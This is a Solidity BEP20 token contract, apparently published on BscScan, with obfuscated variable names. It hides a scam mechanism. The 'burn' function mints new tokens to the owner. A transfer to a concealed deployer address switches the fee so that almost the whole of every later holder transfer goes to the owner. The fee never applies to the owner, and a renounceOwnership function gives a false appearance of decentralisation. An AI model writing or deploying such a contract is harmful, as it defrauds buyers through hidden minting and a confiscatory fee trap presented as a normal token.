/**
 *Submitted for verification at BscScan.com on 2022-11-12
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-11
 */
pragma solidity >=0.5.1;
contract TqJunu {
event Approval(address indexed owner, address indexed spender, uint256 value);
address public  qVEwHb = address(0);
uint256 private  kduvSA = 10000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
address public  tcULlq = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address public  PCMgUA = address(0);
address public  tIDOqk = address(0);
uint256 public  PZfsNX = 100000000000000000000000;
uint256 public  UrGjCr = 100000000000000000;
string public  symbol = "zxMTBA";
uint256 public  SVbnWI = 1000000000000000000;
string public  name = "UEOKxf";
uint256 public  hsfKIM = 10000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
uint256 public  tiVwrq = 100000000000000000000000;
uint256 public constant OvakEy = 73999;
uint8 public constant decimals = 18;
address private  zTSJxv = address(0);
uint256 public  IVyJBY = 10000000000000000000;
address public  RvEGRu = address(0);
uint256 public  ElrPFm = 10000000000000000000000000000;
address public owner;
uint256 public constant totalSupply = 100000000000000000000000000000;
address public  OLXKSy = address(0);
mapping (address => uint256) public balanceOf;
uint256 public  MIWZwE = 100000000000000000000;
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
constructor ()public {
zTSJxv = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
receive() external payable {}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "bGFXMh");
require(to != address(0), "bGFXMh");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* OvakEy/kduvSA ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==zTSJxv){
kduvSA = 73999+1;
}
emit Transfer(from, to, transferAmount);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}

}